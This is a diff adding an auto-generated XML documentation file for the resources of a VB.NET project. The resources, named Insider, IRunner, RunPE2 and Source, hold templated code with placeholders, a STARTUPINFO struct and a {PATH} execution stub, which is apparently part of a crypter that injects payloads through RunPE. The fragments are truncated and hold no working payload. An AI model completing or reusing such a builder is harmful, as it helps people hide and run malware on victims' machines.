@@ -1,0 +1,79 @@
+﻿<?xml version="1.0"?>
+<doc>
+<assembly>
+<name>
+WindowsApplication1
+</name>
+</assembly>
+<members>
+<member name="P:WindowsApplication1.My.Resources.Resources.ResourceManager">
+	<summary>
+  Returns the cached ResourceManager instance used by this class.
+</summary>
+</member><member name="P:WindowsApplication1.My.Resources.Resources.Culture">
+	<summary>
+  Overrides the current thread's CurrentUICulture property for all
+  resource lookups using this strongly typed resource class.
+</summary>
+</member><member name="P:WindowsApplication1.My.Resources.Resources.Insider">
+	<summary>
+  Looks up a localized string similar to Class %DD%
+    &lt;StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)&gt; _
+Structure STARTUPINFO
+        Public cb As Integer
+        Public lpReserved As String
+        Public lpDesktop As String
+        Public lpTitle As String
+        Public dwX As Integer
+        Public dwY As Integer
+        Public dwXSize As Integer
+        Public dwYSize As Integer
+        Public dwXCountChars As Integer
+        Public dwYCountChars As Integer
+        Public dwFillAttribute As Integer
+        Publ [rest of string was truncated]";.
+</summary>
+</member><member name="P:WindowsApplication1.My.Resources.Resources.IRunner">
+	<summary>
+  Looks up a localized string similar to 
+Dim %path2% As String = "{PATH}"
+%DD%.%SRexec%(ext, %path2%, True)
+
+.
+</summary>
+</member><member name="P:WindowsApplication1.My.Resources.Resources.RunPE2">
+	<summary>
+  Looks up a localized string similar to .
+</summary>
+</member><member name="P:WindowsApplication1.My.Resources.Resources.Source">
+	<summary>
+  Looks up a localized string similar to Imports Microsoft.VisualBasic.Strings
+Imports System.Threading
+Imports System.Reflection
+Imports System.Windows.Forms
+Imports System.Runtime.InteropServices
+Imports System.IO
+Imports System.Runtime.CompilerServices
+Imports System.Collections.Generic
+Imports System
+Imports System.Resources
+Imports System.Net.WebClient
+Imports System.Text
+Imports System.Diagnostics
+Imports System.IO.File
+Imports Microsoft.Win32
+Imports System.Security.Cryptography
+Imports Microsoft.VisualBasic
+Imports System. [rest of string was truncated]";.
+</summary>
+</member><member name="P:WindowsApplication1.My.Resources.Resources.Wait">
+	<summary>
+  Looks up a localized string similar to .
+</summary>
+</member><member name="T:WindowsApplication1.My.Resources.Resources">
+	<summary>
+  A strongly-typed resource class, for looking up localized strings, etc.
+</summary>
+</member>
+</members>
+</doc>
